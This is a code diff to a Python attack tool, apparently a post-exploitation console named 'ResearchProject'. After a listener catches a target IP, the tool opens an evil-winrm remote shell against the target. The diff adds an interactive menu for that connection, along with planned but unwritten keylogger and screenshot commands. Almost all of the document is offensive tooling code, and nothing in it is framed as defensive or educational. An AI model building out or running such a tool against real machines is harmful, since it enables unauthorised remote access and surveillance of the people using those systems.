@@ -1,6 +1,7 @@
 import subprocess
 import sys
 import socket
+import getpass
 
 BANNER = r"""
 :::::::::  :::::::::: ::::::::  ::::::::::     :::     :::::::::   ::::::::  :::    :::          :::::::::  :::::::::   ::::::::  ::::::::::: :::::::::: :::::::: :::::::::::
@@ -41,10 +42,43 @@ def connect_evil_winrm(target_ip):
     ]
     subprocess.run(cmd)
 
+def cli(target_ip):
+    username = getpass.getuser()
+    help_text = """
+        Available commands:
+        help, h        Show this help menu
+        evil-winrm     Connect to target using evil-winrm
+        key-logger     To be determined
+        screen-shot    To be determined
+        exit, q        Exit the console
+    """
+    print("[*]Type help or h to see all commands...\n")
+    while True:
+        cmd = input(f"{username}@ResearchProject# ")
+        if cmd == "exit" or cmd == "q":
+            break
+        elif cmd == "help" or cmd == "h":
+            print(help_text)
+        elif cmd == "evil-winrm":
+            connect_evil_winrm(target_ip)
+        elif cmd == "key-logger":
+            print("In progress...")
+        elif cmd == "screen-shot":
+            print("In progress...")
+        elif cmd == "":
+            continue
+        else:
+            print(f"[-] Unknown command: {cmd}")
+
+
 def main():
     print(BANNER)
-    target_ip = start_listener()
-    connect_evil_winrm(target_ip)
+    try:
+        target_ip = start_listener()
+        cli(target_ip)
+    except KeyboardInterrupt:
+        print("\n[!] Stopped by user.")
+    
 
 if __name__ == "__main__":
     main()
